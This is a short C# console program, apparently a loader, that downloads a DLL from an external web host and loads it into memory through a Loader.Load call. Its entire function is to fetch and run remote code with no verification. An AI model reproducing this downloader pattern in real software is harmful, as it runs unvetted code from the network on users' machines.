using System.Net;
using System.Reflection;

namespace Console4NothingLoader
{
    internal class Program
    {
        public static void Main(string[] args)
        {
            Loader.Load(new WebClient().DownloadData("https://files.nekro-works.de/Console4Nothing.dll"));
        }
    }
}